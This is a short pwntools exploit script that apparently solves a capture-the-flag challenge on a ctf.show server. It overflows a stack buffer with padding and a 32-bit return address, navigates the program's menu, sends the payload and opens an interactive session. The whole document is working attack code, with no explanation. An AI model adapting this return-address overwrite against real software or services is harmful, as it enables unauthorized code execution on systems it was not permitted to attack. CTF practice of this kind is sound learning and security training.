from pwn import *
context(arch = 'i386',os = 'linux',log_level = 'debug')
io = remote('pwn.challenge.ctf.show',28148)
payload = b'a'*(0x14+4)+p32(0x0804893F)
payload.ljust(0x100,b'a')

io.sendlineafter(b'Your choice:',b'1')
io.sendlineafter(b'username:',b'a')
io.recv()
io.sendline(payload)
io.interactive()